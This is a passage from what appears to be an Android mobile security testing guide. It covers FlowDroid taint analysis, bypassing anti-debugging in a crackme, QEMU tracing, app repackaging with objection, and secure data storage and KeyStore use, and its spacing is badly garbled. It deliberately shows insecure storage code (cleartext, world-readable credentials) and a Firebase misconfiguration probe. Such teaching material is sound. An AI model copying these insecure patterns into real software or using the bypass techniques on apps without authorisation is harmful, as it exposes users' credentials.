Forourdemonstration,we’lluseFlowDroid’scommandlinetooltoperformtaintanalysisontheInsecureShopv1.0appli- cation. TheInsecureShopappacceptsausernameandpasswordasinputandstoresthemintheapp’ssharedpreferences. In ourtaintanalysis, we’reinterestedinhowthisstoredusernameandpasswordareused. Inthiscontext, theusername andpasswordarethesensitiveinformation,andreadingfromsharedpreferencesisthesource. Thesinkinthisanalysis couldbevariousoperations,suchassendinginfooverthenetwork,transmittinginfoviaanIntent,orstoringinfoinan externalfile. TouseFlowDroid,firstly,weneedtoprovideaninputlistofpotentialsourcesandsinkstoevaluatefor. Inourcase,reading fromsharedpreferenceswillbethesource,whileaddingparameterstoanIntentwillbethesink. Theconfigurationfile willlookasfollows(we’llnameit“source_sink.txt”): <android.content.SharedPreferences:java.lang.StringgetString(java.lang.String,java.lang.String)>->_SOURCE_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.CharSequence)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,char)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.String)>->_SINK_ ToinvokeFlowDroidviathecommandline,usethefollowingcommand: 185\njava-jarsoot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar\ -aInsecureShop.apk\ -pAndroid/Sdk/platforms\ -ssource_sink.txt [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>("password",$r5)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>("password","")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetPassword()> ... [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>("username",$r4)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>("username","")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetUsername()> ... [main]INFOsoot.jimple.infoflow.android.SetupApplication-Found2leaks Theoutputalsousesthejimpleintermediaterepresentationandrevealstwoleaksintheapplication,eachcorresponding to the username and password. Given that the InsecureShop app is open-source, we can refer to its source code to validatethefindings,asshownbelow: //file:AboutActivity.kt funonSendData(view:View){ valuserName =Prefs.username!! valpassword =Prefs.password!! valintent =Intent("com.insecureshop.action.BROADCAST") intent.putExtra("username",userName) intent.putExtra("password",password) sendBroadcast(intent) textView.text ="InsecureShopisanintentionallydesignedvulnerableandroidappbuiltinKotlin." } Taint analysis is especially beneficial for automating data flow analysis in intricate applications. However, given the complexityofsomeapps,theaccuracyofsuchtoolscanvary. Thus,it’sessentialforreviewerstofindabalancebetween theaccuracyoftoolsandthetimespentonmanualanalysis. Waiting for the Debugger Platform: android TheUnCrackableAppforAndroidLevel1isnotstupid: itnoticesthatithasbeenrunindebuggablemodeandreactsby shuttingdown. Amodaldialogisshownimmediately,andthecrackmeterminatesonceyoutap“OK”. Fortunately,Android’s“Developeroptions”containtheuseful“WaitforDebugger”feature,whichallowsyoutoautomat- icallysuspendanappduringstartupuntilaJDWPdebuggerconnects. Withthisfeature,youcanconnectthedebugger beforethedetectionmechanismruns,andtrace,debug,anddeactivatethatmechanism. It’sreallyanunfairadvantage, but,ontheotherhand,reverseengineersneverplayfair! 186\nIntheDeveloperoptions,pickUncrackable1asthedebuggingapplicationandactivatethe“WaitforDebugger”switch. 187\nNote: Even with ro.debuggable set to “1” in default.prop, an app won’t show up in the “debug app” list unless the android:debuggableflagissetto"true"intheAndroidManifest. Emulation-based Analysis Platform: android The Android emulator is based on QEMU, a generic and open source machine emulator. QEMU emulates a guest CPU bytranslatingtheguestinstructionson-the-flyintoinstructionsthehostprocessorcanunderstand. Eachbasicblockof guestinstructionsisdisassembledandtranslatedintoanintermediaterepresentationcalledTinyCodeGenerator(TCG). TheTCGblockiscompiledintoablockofhostinstructions,storedinacodecache,andexecuted. Afterexecutionofthe basicblock,QEMUrepeatstheprocessforthenextblockofguestinstructions(orloadsthealreadytranslatedblockfrom thecache). Thewholeprocessiscalleddynamicbinarytranslation. BecausetheAndroidemulatorisaforkofQEMU,itcomeswithallQEMUfeatures,includingmonitoring,debugging,and tracingfacilities. QEMU-specificparameterscanbepassedtotheemulatorwiththe-qemucommandlineflag. Youcan useQEMU’sbuilt-intracingfacilitiestologexecutedinstructionsandvirtualregistervalues. StartingQEMUwiththe-d commandlineflagwillcauseittodumptheblocksofguestcode,microoperations,orhostinstructionsbeingexecuted. Withthe-d_asmflag,QEMUlogsallbasicblocksofguestcodeastheyenterQEMU’stranslationfunction. Thefollowing commandlogsalltranslatedblockstoafile: emulator -show-kernel -avd Nexus_4_API_19 -snapshot default-boot -no-snapshot-save -qemu -din_asm,cpu 2>/tmp/qemu.log Unfortunately,generatingacompleteguestinstructiontracewithQEMUisimpossiblebecausecodeblocksarewrittento thelogonlyatthetimetheyaretranslated,notwhenthey’retakenfromthecache. Forexample,ifablockisrepeatedly executed in a loop, only the first iteration will be printed to the log. There’s no way to disable TB caching in QEMU (besideshackingthesourcecode). Nevertheless,thefunctionalityissufficientforbasictasks,suchasreconstructingthe disassemblyofanativelyexecutedcryptographicalgorithm. 188\nReverse Engineering Android Apps Platform: android Android’sopennessmakesitafavorableenvironmentforreverseengineers,offeringbigadvantagesthatarenotavailable withiOS.BecauseAndroidisopen-source,youcanstudyitssourcecodeattheAndroidOpenSourceProject(AOSP)and modifytheOSanditsstandardtoolsanywayyouwant. Evenonstandardretaildevices,itispossibletodothingslike activatingdevelopermodeandsideloadingappswithoutjumpingthroughmanyhoops. Fromthepowerfultoolsshipping withtheSDKtothewiderangeofavailablereverseengineeringtools,there’salotofnicetiestomakeyourlifeeasier. However,therearealsoafewAndroid-specificchallenges. Forexample,you’llneedtodealwithbothJavabytecodeand nativecode. JavaNativeInterface(JNI)issometimesdeliberatelyusedtoconfusereverseengineers(tobefair,thereare legitimatereasonsforusingJNI,suchasimprovingperformanceorsupportinglegacycode). Developerssometimesuse thenativelayerto“hide”dataandfunctionality,andtheymaystructuretheirappssuchthatexecutionfrequentlyjumps betweenthetwolayers. You’llneedatleastaworkingknowledgeofboththeJava-basedAndroidenvironmentandtheLinuxOSandKernel, on which Android is based. You’ll also need the right toolset to deal with both the bytecode running on the Java virtual machineandthenativecode. Repackaging Apps Platform: android Ifyouneedtotestonanon-jailbrokendeviceyoushouldlearnhowtorepackageanapptoenabledynamictestingon it. Useacomputertoperformallthestepsindicatedinthearticle“PatchingAndroidApplications”fromtheobjectionWiki. Onceyou’redoneyou’llbeabletopatchanAPKbycallingtheobjectioncommand: objectionpatchapk --source app-release.apk Thepatchedapplicationthenneedstobeinstalledusingadb,asexplainedin“InstallingApps”. Thisrepackagingmethodisenoughformostusecases. Formoreadvancedrepackaging,referto“AndroidTampering andReverseEngineering-Patching,RepackagingandRe-Signing”. 189\nAndroid Data Storage Overview Thischapterdiscussestheimportanceofsecuringsensitivedata,likeauthenticationtokensandprivateinformation,vital formobilesecurity. We’lllookatAndroid’sAPIsforlocaldatastorageandsharebestpractices. While it’s preferable to limit sensitive data on local storage, or avoid it at all whenever possible, practical use cases oftennecessitateuserdatastorage. Forexample,toimproveuserexperience,appscacheauthenticationtokenslocally, circumventingtheneedforcomplexpasswordentryateachappstart. Appsmayalsoneedtostorepersonallyidentifiable information(PII)andothersensitivedata. Sensitivedatacanbecomevulnerableifimproperlyprotected,potentiallystoredinvariouslocations,includingthedevice oranexternalSDcard. It’simportanttoidentifytheinformationprocessedbythemobileappandclassifywhatcounts as sensitive data. Check out the “Identifying Sensitive Data” section in the “Mobile App Security Testing” chapter for data classification details. Refer to Security Tips for Storing Data in the Android developer’s guide for comprehensive insights. Sensitive information disclosure risks include potential information decryption, social engineering attacks (if PII is dis- closed), account hijacking (if session information or an authentication token is disclosed), and app exploitation with a paymentoption. In addition to data protection, validate and sanitize data from any storage source. This includes checking correct data typesandimplementingcryptographiccontrols,suchasHMACs,fordataintegrity. Androidoffersvariousdatastoragemethods,tailoredtousers,developers,andapplications. Commonpersistentstorage techniquesinclude: • SharedPreferences • SQLiteDatabases • FirebaseDatabases • RealmDatabases • InternalStorage • ExternalStorage • Keystore Additionally,otherAndroidfunctionsthatcanresultindatastorageandshouldbetestedinclude: • LoggingFunctions • AndroidBackups • ProcessesMemory • KeyboardCaches • Screenshots Understanding each relevant data storage function is crucial for performing the appropriate test cases. This overview providesabriefoutlineofthesedatastoragemethodsandpointstesterstofurtherrelevantdocumentation. Shared Preferences The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world- readable(accessibletoallapps)orprivate. MisuseoftheSharedPreferencesAPIcanoftenleadtoexposureofsensitive data. Considerthefollowingexample: ExampleforJava: SharedPreferencessharedPref =getSharedPreferences("key",MODE_WORLD_READABLE); SharedPreferences.Editor editor =sharedPref.edit(); editor.putString("username","administrator"); editor.putString("password","supersecret"); editor.commit(); 190\nExampleforKotlin: varsharedPref =getSharedPreferences("key",Context.MODE_WORLD_READABLE) vareditor =sharedPref.edit() editor.putString("username","administrator") editor.putString("password","supersecret") editor.commit() Oncetheactivityhasbeencalled,thefilekey.xmlwillbecreatedwiththeprovideddata. Thiscodeviolatesseveralbest practices. • Theusernameandpasswordarestoredincleartextin/data/data/<package-name>/shared_prefs/key.xml. <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map> <string name="username">administrator</string> <string name="password">supersecret</string> </map> • MODE_WORLD_READABLEallowsallapplicationstoaccessandreadthecontentsofkey.xml. root@hermes:/data/data/sg.vp.owasp_mobile.myfirstapp/shared_prefs #ls-la -rw-rw-r--u0_a118 1702016-04-2316:51key.xml PleasenotethatMODE_WORLD_READABLEandMODE_WORLD_WRITEABLEweredeprecatedstartingonAPIlevel17. Al- thoughnewerdevicesmaynotbeaffectedbythis,applicationscompiledwithanandroid:targetSdkVersionvalue lessthan17maybeaffectediftheyrunonanOSversionthatwasreleasedbeforeAndroid4.2(APIlevel17). Databases TheAndroidplatformprovidesanumberofdatabaseoptionsasaforementionedinthepreviouslist. Eachdatabaseoption hasitsownquirksandmethodsthatneedtobeunderstood. SQLite Database (Unencrypted) SQLiteisanSQLdatabaseenginethatstoresdatain.dbfiles. TheAndroidSDKhasbuilt-insupportforSQLitedatabases. Themainpackageusedtomanagethedatabasesisandroid.database.sqlite. Forexample,youmayusethefollowing codetostoresensitiveinformationwithinanactivity: ExampleinJava: SQLiteDatabasenotSoSecure =openOrCreateDatabase("privateNotSoSecure",MODE_PRIVATE,null); notSoSecure.execSQL("CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);"); notSoSecure.execSQL("INSERTINTOAccountsVALUES('admin','AdminPass');"); notSoSecure.close(); ExampleinKotlin: varnotSoSecure =openOrCreateDatabase("privateNotSoSecure",Context.MODE_PRIVATE,null) notSoSecure.execSQL("CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);") notSoSecure.execSQL("INSERTINTOAccountsVALUES('admin','AdminPass');") notSoSecure.close() Once the activity has been called, the database file privateNotSoSecure will be created with the provided data and storedinthecleartextfile/data/data/<package-name>/databases/privateNotSoSecure. Thedatabase’sdirectorymaycontainseveralfilesbesidestheSQLitedatabase: • Journalfiles: Thesearetemporaryfilesusedtoimplementatomiccommitandrollback. • Lock files: The lock files are part of the locking and journaling feature, which was designed to improve SQLite concurrencyandreducethewriterstarvationproblem. SensitiveinformationshouldnotbestoredinunencryptedSQLitedatabases. 191\nSQLite Databases (Encrypted) WiththelibrarySQLCipher,youcanpassword-encryptSQLitedatabases. ExampleinJava: SQLiteDatabasesecureDB =SQLiteDatabase.openOrCreateDatabase(database,"password123",null); secureDB.execSQL("CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);"); secureDB.execSQL("INSERTINTOAccountsVALUES('admin','AdminPassEnc');"); secureDB.close(); ExampleinKotlin: varsecureDB =SQLiteDatabase.openOrCreateDatabase(database,"password123",null) secureDB.execSQL("CREATETABLEIFNOTEXISTSAccounts(UsernameVARCHAR,PasswordVARCHAR);") secureDB.execSQL("INSERTINTOAccountsVALUES('admin','AdminPassEnc');") secureDB.close() Securewaystoretrievethedatabasekeyinclude: • AskingtheusertodecryptthedatabasewithaPINorpasswordoncetheappisopened(weakpasswordsandPINs arevulnerabletobruteforceattacks) • Storingthekeyontheserverandallowingittobeaccessedfromawebserviceonly(sothattheappcanbeused onlywhenthedeviceisonline) Firebase Real-time Databases Firebaseisadevelopmentplatformwithmorethan15products,andoneofthemisFirebaseReal-timeDatabase. Itcan beleveragedbyapplicationdeveloperstostoreandsyncdatawithaNoSQLcloud-hosteddatabase. Thedataisstored asJSONandissynchronizedinreal-timetoeveryconnectedclientandalsoremainsavailableevenwhentheapplication goesoffline. AmisconfiguredFirebaseinstancecanbeidentifiedbymakingthefollowingnetworkcall: https://_firebaseProjectName_.firebaseio.com/.json ThefirebaseProjectNamecanberetrievedfromthemobileapplicationbyreverseengineeringtheapplication. Alterna- tively,theanalystscanuseFirebaseScanner,apythonscriptthatautomatesthetaskaboveasshownbelow: pythonFirebaseScanner.py -p<pathOfAPKFile> pythonFirebaseScanner.py -f<commaSeparatedFirebaseProjectNames> Realm Databases TheRealmDatabaseforJavaisbecomingmoreandmorepopularamongdevelopers. Thedatabaseanditscontentscan beencryptedwithakeystoredintheconfigurationfile. //thegetKey()methodeithergetsthekeyfromtheserverorfromaKeyStore,orisderivedfromapassword. RealmConfigurationconfig =newRealmConfiguration.Builder() .encryptionKey(getKey()) .build(); Realmrealm =Realm.getInstance(config); Ifthedatabaseisnotencrypted,youshouldbeabletoobtainthedata. Ifthedatabaseisencrypted,determinewhether thekeyishard-codedinthesourceorresourcesandwhetheritisstoredunprotectedinsharedpreferencesorsomeother location. 192\nInternal Storage Youcansavefilestothedevice’sinternalstorage. Filessavedtointernalstoragearecontainerizedbydefaultandcannot beaccessedbyotherappsonthedevice. Whentheuseruninstallsyourapp,thesefilesareremoved. Thefollowingcode snippetswouldpersistentlystoresensitivedatatointernalstorage. ExampleforJava: FileOutputStreamfos =null; try{ fos=openFileOutput(FILENAME,Context.MODE_PRIVATE); fos.write(test.getBytes()); fos.close(); }catch (FileNotFoundExceptione){ e.printStackTrace(); }catch (IOExceptione){ e.printStackTrace(); } ExampleforKotlin: varfos:FileOutputStream?=null fos=openFileOutput("FILENAME",Context.MODE_PRIVATE) fos.write(test.toByteArray(Charsets.UTF_8)) fos.close() Youshouldcheckthefilemodetomakesurethatonlytheappcanaccessthefile. YoucansetthisaccesswithMODE_PRI- VATE.ModessuchasMODE_WORLD_READABLE(deprecated)andMODE_WORLD_WRITEABLE(deprecated)mayposeasecurity risk. SearchfortheclassFileInputStreamtofindoutwhichfilesareopenedandreadwithintheapp. External Storage EveryAndroid-compatibledevicesupportssharedexternalstorage. Thisstoragemayberemovable(suchasanSDcard) or internal (non-removable). Files saved to external storage are world-readable. The user can modify them when USB massstorageisenabled. Youcanusethefollowingcodesnippetstopersistentlystoresensitiveinformationtoexternal storageasthecontentsofthefilepassword.txt. ExampleforJava: Filefile =newFile (Environment.getExternalFilesDir(),"password.txt"); Stringpassword ="SecretPassword"; FileOutputStreamfos; fos=newFileOutputStream(file); fos.write(password.getBytes()); fos.close(); ExampleforKotlin: valpassword ="SecretPassword" valpath =context.getExternalFilesDir(null) valfile =File(path,"password.txt") file.appendText(password) Thefilewillbecreatedandthedatawillbestoredinacleartextfileinexternalstorageoncetheactivityhasbeencalled. It’salsoworthknowingthatfilesstoredoutsidetheapplicationfolder(data/data/<package-name>/)willnotbedeleted whentheuseruninstallstheapplication. Finally,it’sworthnotingthattheexternalstoragecanbeusedbyanattackerto allowforarbitrarycontroloftheapplicationinsomecases. Formoreinformation: seetheblogpostfromCheckpoint. 193\nKeyStore TheAndroidKeyStoresupportsrelativelysecurecredentialstorage. AsofAndroid4.3(APIlevel18),itprovidespublicAPIs forstoringandusingapp-privatekeys. Anappcanuseapublickeytocreateanewprivate/publickeypairforencrypting applicationsecrets,anditcandecryptthesecretswiththeprivatekey. YoucanprotectkeysstoredintheAndroidKeyStorewithuserauthenticationinaconfirmcredentialflow. Theuser’slock screencredentials(pattern,PIN,password,orfingerprint)areusedforauthentication. Youcanusestoredkeysinoneoftwomodes: 1. Usersareauthorizedtousekeysforalimitedperiodoftimeafterauthentication. Inthismode,allkeyscanbeused assoonastheuserunlocksthedevice. Youcancustomizetheperiodofauthorizationforeachkey. Youcanuse thisoptiononlyifthesecurelockscreenisenabled. Iftheuserdisablesthesecurelockscreen,allstoredkeyswill becomepermanentlyinvalid. 2. Usersareauthorizedtouseaspecificcryptographicoperationthatisassociatedwithonekey. Inthismode,users mustrequestaseparateauthorizationforeachoperationthatinvolvesthekey. Currently,fingerprintauthentication istheonlywaytorequestsuchauthorization. ThelevelofsecurityaffordedbytheAndroidKeyStoredependsonitsimplementation,whichdependsonthedevice. Most moderndevicesofferahardware-backedKeyStoreimplementation: keysaregeneratedandusedinaTrustedExecution Environment(TEE)oraSecureElement(SE),andtheoperatingsystemcan’taccessthemdirectly. Thismeansthatthe encryptionkeysthemselvescan’tbeeasilyretrieved,evenfromarooteddevice. Youcanverifyhardware-backedkeys withKeyAttestation. Youcandeterminewhetherthekeysareinsidethesecurehardwarebycheckingthereturnvalueof theisInsideSecureHardwaremethod,whichispartoftheKeyInfoclass. NotethattherelevantKeyInfoindicatesthatsecretkeysandHMACkeysareinsecurelystoredonseveraldevices despiteprivatekeysbeingcorrectlystoredonthesecurehardware. Thekeysofasoftware-onlyimplementationareencryptedwithaper-userencryptionmasterkey. Anattackercanaccess allkeysstoredonrooteddevicesthathavethisimplementationinthefolder/data/misc/keystore/. Becausetheuser’s lock screen pin/password is used to generate the master key, the Android KeyStore is unavailable when the device is locked. FormoresecurityAndroid9(APIlevel28)introducestheunlockedDeviceRequiredflag. Bypassingtruetothe setUnlockedDeviceRequiredmethod,theapppreventsitskeysstoredinAndroidKeystorefrombeingdecryptedwhen thedeviceislocked,anditrequiresthescreentobeunlockedbeforeallowingdecryption. Hardware-backed Android KeyStore Thehardware-backedAndroidKeyStoregivesanotherlayertodefense-in-depthsecurityconceptforAndroid. Keymaster HardwareAbstractionLayer(HAL)wasintroducedwithAndroid6(APIlevel23). Applicationscanverifyifthekeyisstored insidethesecurityhardware(bycheckingifKeyInfo.isinsideSecureHardwarereturnstrue). DevicesrunningAndroid 9 (API level 28) and higher can have a StrongBox Keymaster module, an implementation of the Keymaster HAL that resides in a hardware security module which has its own CPU, secure storage, a true random number generator and a mechanismtoresistpackagetampering. Tousethisfeature,truemustbepassedtothesetIsStrongBoxBackedmethod ineithertheKeyGenParameterSpec.BuilderclassortheKeyProtection.Builderclasswhengeneratingorimporting keysusingAndroidKeystore. TomakesurethatStrongBoxisusedduringruntime,checkthatisInsideSecureHardware returnstrueandthatthesystemdoesnotthrowStrongBoxUnavailableException,whichgetsthrowniftheStrongBox Keymasterisn’tavailableforthegivenalgorithmandkeysizeassociatedwithakey. Descriptionoffeaturesonhardware- basedkeystorecanbefoundonAOSPpages. KeymasterHALisaninterfacetohardware-backedcomponents-TrustedExecutionEnvironment(TEE)oraSecureElement (SE),whichisusedbyAndroidKeystore. Anexampleofsuchahardware-backedcomponentisTitanM. Key Attestation FortheapplicationswhichheavilyrelyonAndroidKeystoreforbusiness-criticaloperations,suchasmulti-factorauthen- tication through cryptographic primitives, secure storage of sensitive data at the client-side, etc. Android provides the 194\nfeatureofKeyAttestation,whichhelpstoanalyzethesecurityofcryptographicmaterialmanagedthroughAndroidKey- store. FromAndroid8.0(APIlevel26),thekeyattestationwasmademandatoryforallnew(Android7.0orhigher)devices thatneedtohavedevicecertificationforGoogleapps. SuchdevicesuseattestationkeyssignedbytheGooglehardware AttestationRootcertificateandthesamecanbeverifiedthroughthekeyattestationprocess. Duringkeyattestation,wecanspecifythealiasofakeypairandinreturn,getacertificatechain,whichwecanuseto verifythepropertiesofthatkeypair. IftherootcertificateofthechainistheGoogleHardwareAttestationRootcertificate, andthechecksrelatedtokeypairstorageinhardwarearemade,itgivesanassurancethatthedevicesupportshardware- levelkeyattestation,andthatthekeyisinthehardware-backedkeystorethatGooglebelievestobesecure. Alternatively, if the attestation chain has any other root certificate, then Google does not make any claims about the security of the hardware. Althoughthekeyattestationprocesscanbeimplementedwithintheapplicationdirectly,itisrecommendedthatitshould beimplementedattheserver-sideforsecurityreasons. Thefollowingarethehigh-levelguidelinesforthesecureimple- mentationofKeyAttestation: • TheservershouldinitiatethekeyattestationprocessbycreatingarandomnumbersecurelyusingCSPRNG(Cryp- tographicallySecureRandomNumberGenerator)andthesameshouldbesenttotheuserasachallenge. • TheclientshouldcallthesetAttestationChallengeAPIwiththechallengereceivedfromtheserverandshould thenretrievetheattestationcertificatechainusingtheKeyStore.getCertificateChainmethod. • Theattestationresponseshouldbesenttotheserverfortheverificationandfollowingchecksshouldbeperformed fortheverificationofthekeyattestationresponse: – Verifythecertificatechain,uptotherootandperformcertificatesanitycheckssuchasvalidity,integrityand trustworthiness. ChecktheCertificateRevocationStatusListmaintainedbyGoogle,ifnoneofthecertificates inthechainwasrevoked. – CheckiftherootcertificateissignedwiththeGoogleattestationrootkeywhichmakestheattestationprocess trustworthy. – Extract the attestation certificate extension data, which appears within the first element of the certificate chain,andperformthefollowingchecks: ∗ Verifythattheattestationchallengeishavingthesamevaluewhichwasgeneratedattheserverwhile initiatingtheattestationprocess. ∗ Verifythesignatureinthekeyattestationresponse. ∗ VerifythesecurityleveloftheKeymaster,todetermineifthedevicehassecurekeystoragemechanism. Keymaster is a piece of software that runs in the security context and provides all the secure keystore operations. ThesecuritylevelwillbeoneofSoftware, TrustedEnvironmentorStrongBox. Theclient supports hardware-level key attestation if the security level is TrustedEnvironment or StrongBox and theattestationcertificatechaincontainsarootcertificatesignedwiththeGoogleattestationrootkey. ∗ Verifytheclient’sstatustoensureafullchainoftrust-verifiedbootkey,lockedbootloaderandverified bootstate. ∗ Additionally,youcanverifythekeypair’sattributessuchaspurpose,accesstime,authenticationrequire- ment,etc. Note,ifforanyreasonthatprocessfails,itmeansthatthekeyisnotinsecurityhardware. Thatdoesnotmeanthat thekeyiscompromised. ThetypicalexampleofAndroidKeystoreattestationresponselookslikethis: { "fmt":"android-key", "authData":"9569088f1ecee3232954035dbd10d7cae391305a2751b559bb8fd7cbb229bd...", "attStmt":{ "alg":-7, "sig":"304402202ca7a8cfb6299c4a073e7e022c57082a46c657e9e53...", "x5c":[ "308202ca30820270a003020102020101300a06082a8648ce3d040302308188310b30090603550406130...", "308202783082021ea00302010202021001300a06082a8648ce3d040302308198310b300906035504061...", "3082028b30820232a003020102020900a2059ed10e435b57300a06082a8648ce3d040302308198310b3..." ] } } IntheaboveJSONsnippet,thekeyshavethefollowingmeaning: • fmt: Attestationstatementformatidentifier 195\n• authData: Itdenotestheauthenticatordatafortheattestation • alg: ThealgorithmthatisusedfortheSignature • sig: Signature • x5c: Attestationcertificatechain Note: The sig is generated by concatenating authData and clientDataHash (challenge sent by the server) and signingthroughthecredentialprivatekeyusingthealgsigningalgorithm. Thesameisverifiedattheserver-side byusingthepublickeyinthefirstcertificate. Formoreunderstandingontheimplementationguidelines,youcanrefertoGoogleSampleCode. For the security analysis perspective, the analysts may perform the following checks for the secure implementation of KeyAttestation: • Checkifthekeyattestationistotallyimplementedontheclient-side. Inwhichcase,itcanbemoreeasilybypassed bytamperingtheapplication,methodhooking,etc. • Checkiftheserverusesrandomchallengewhileinitiatingthekeyattestation. Asfailingtodothatwouldleadto insecureimplementationthusmakingitvulnerabletoreplayattacks. Also,checkspertainingtotherandomnessof thechallengeshouldbeperformed. • Checkiftheserververifiestheintegrityofthekeyattestationresponse. • Check if the server performs basic checks such as integrity verification, trust verification, validity, etc. on the certificatesinthechain. Secure Key Import into Keystore Android 9 (API level 28) adds the ability to import keys securely into the AndroidKeystore. First, AndroidKeystore generatesakeypairusingPURPOSE_WRAP_KEY,whichshouldalsobeprotectedwithanattestationcertificate. Thispair aims to protect the Keys being imported to AndroidKeystore. The encrypted keys are generated as ASN.1-encoded message in the SecureKeyWrapper format, which also contains a description of the ways the imported key is allowed to be used. The keys are then decrypted inside the AndroidKeystore hardware belonging to the specific device that generatedthewrappingkey,sothattheyneverappearasplaintextinthedevice’shostmemory. 196\nFigure 2: Secure key import into Keystore ExampleinJava: KeyDescription ::=SEQUENCE { keyFormatINTEGER, authorizationListAuthorizationList } SecureKeyWrapper ::=SEQUENCE { wrapperFormatVersionINTEGER, encryptedTransportKeyOCTET_STRING, initializationVectorOCTET_STRING, keyDescriptionKeyDescription, secureKeyOCTET_STRING, tagOCTET_STRING } ThecodeabovepresentsthedifferentparameterstobesetwhengeneratingtheencryptedkeysintheSecureKeyWrapper format. ChecktheAndroiddocumentationonWrappedKeyEntryformoredetails. WhendefiningtheKeyDescriptionAuthorizationList,thefollowingparameterswillaffecttheencryptedkeyssecurity: • Thealgorithmparameterspecifiesthecryptographicalgorithmwithwhichthekeyisused • ThekeySizeparameterspecifiesthesize,inbits,ofthekey,measuringinthenormalwayforthekey’salgorithm • Thedigestparameterspecifiesthedigestalgorithmsthatmaybeusedwiththekeytoperformsigningandverifi- cationoperations 197\nOlder KeyStore Implementations OlderAndroidversions don’t includeKeyStore, but theydoincludethe KeyStoreinterface fromJCA(Java Cryptography Architecture). YoucanuseKeyStoresthatimplementthisinterfacetoensurethesecrecyandintegrityofkeysstoredwith KeyStore;BouncyCastleKeyStore(BKS)isrecommended. Allimplementationsarebasedonthefactthatfilesarestored onthefilesystem;allfilesarepassword-protected. Tocreateone,usetheKeyStore.getInstance("BKS","BC")method, where “BKS” is the KeyStore name (BouncyCastle Keystore) and “BC” is the provider (BouncyCastle). You can also use SpongyCastleasawrapperandinitializetheKeyStoreasfollows: KeyStore.getInstance("BKS", "SC"). BeawarethatnotallKeyStoresproperlyprotectthekeysstoredintheKeyStorefiles. Storing a Cryptographic Key: Techniques TomitigateunauthorizeduseofkeysontheAndroiddevice,AndroidKeyStoreletsappsspecifyauthorizedusesoftheir keyswhengeneratingorimportingthekeys. Oncemade,authorizationscannotbechanged. StoringaKey-frommostsecuretoleastsecure: • thekeyisstoredinhardware-backedAndroidKeyStore • allkeysarestoredonserverandareavailableafterstrongauthentication • themasterkeyisstoredontheserverandusedtoencryptotherkeys,whicharestoredinAndroidSharedPreferences • thekeyisderivedeachtimefromastronguserprovidedpassphrasewithsufficientlengthandsalt • thekeyisstoredinthesoftwareimplementationofAndroidKeyStore • themasterkeyisstoredinthesoftwareimplementationofAndroidKeystoreandusedtoencryptotherkeys,which arestoredinSharedPreferences • [notrecommended]allkeysarestoredinSharedPreferences • [notrecommended]hardcodedencryptionkeysinthesourcecode • [notrecommended]predictableobfuscationfunctionorkeyderivationfunctionbasedonstableattributes • [notrecommended]storedgeneratedkeysinpublicplaces(like/sdcard/) Storing Keys Using Hardware-backed Android KeyStore You can use the hardware-backed Android KeyStore if the device is running Android 7.0 (API level 24) and above with availablehardwarecomponent(TrustedExecutionEnvironment(TEE)oraSecureElement(SE)).Youcanevenverifythat the keys are hardware-backed by using the guidelines provided for the secure implementation of Key Attestation. If a hardwarecomponentisnotavailableand/orsupportforAndroid6.0(APIlevel23)andbelowisrequired,thenyoumight wanttostoreyourkeysonaremoteserverandmakethemavailableafterauthentication. Storing Keys on the Server Itispossibletosecurelystorekeysonakeymanagementserver,howevertheappneedstobeonlinetodecryptthedata. Thismightbealimitationforcertainmobileappusecasesandshouldbecarefullythoughtthrough,asthisbecomespart ofthearchitectureoftheappandmighthighlyimpactusability. Deriving Keys from User Input Derivingakeyfromauserprovidedpassphraseisacommonsolution(dependingonwhichAndroidAPIlevelyouuse), butitalsoimpactsusability,mightaffecttheattacksurfaceandcouldintroduceadditionalweaknesses. Eachtimetheapplicationneedstoperformacryptographicoperation,theuser’spassphraseisneeded. Eithertheuser ispromptedforiteverytime, whichisn’tanidealuserexperience,orthepassphraseiskeptinmemoryaslongasthe userisauthenticated. Keepingthepassphraseinmemoryisnotabest-practice,asanycryptographicmaterialmustonly bekeptinmemorywhileitisbeingused. Zeroingoutakeyisoftenaverychallengingtaskasexplainedin“Cleaningout KeyMaterial”. Additionally,considerthatkeysderivedfromapassphrasehavetheirownweaknesses. Forinstance,thepasswordsor passphrases might be reused by the user or easy to guess. Please refer to the Testing Cryptography chapter for more information. 198\nCleaning out Key Material The key material should be cleared out from memory as soon as it is not need anymore. There are certain limitations ofreliablycleaningupsecretdatainlanguageswithgarbagecollector(Java)andimmutablestrings(Swift,Objective-C, Kotlin). Java Cryptography Architecture Reference Guide suggests using char[] instead of String for storing sensitive data,andnullifyarrayafterusage. Note that some ciphers do not properly clean up their byte-arrays. For instance, the AES Cipher in BouncyCastle does notalwayscleanupitslatestworkingkey,leavingsomecopiesofthebyte-arrayinmemory. Next,BigIntegerbasedkeys (e.g.privatekeys)cannotberemovedfromtheheap,norzeroedoutwithoutadditionaleffort. Clearingbytearraycanbe achievedbywritingawrapperwhichimplementsDestroyable. Storing Keys using Android KeyStore API A more user-friendly and 